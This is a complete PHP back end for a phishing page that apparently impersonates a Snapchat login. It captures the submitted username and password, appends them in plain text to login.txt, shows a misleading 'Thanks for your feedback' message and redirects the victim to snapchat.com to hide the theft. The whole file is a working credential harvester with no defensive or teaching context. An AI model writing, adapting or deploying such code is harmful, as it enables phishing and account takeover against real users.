<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["username"];
    $pass = $_POST["password"];

    $data = "Username: $user | Password: $pass\n";

    file_put_contents("login.txt", $data, FILE_APPEND);

    echo "<h2>Thanks for your feedback</h2>";

    header("refresh:2; url=https://www.snapchat.com");
    exit();
}
?>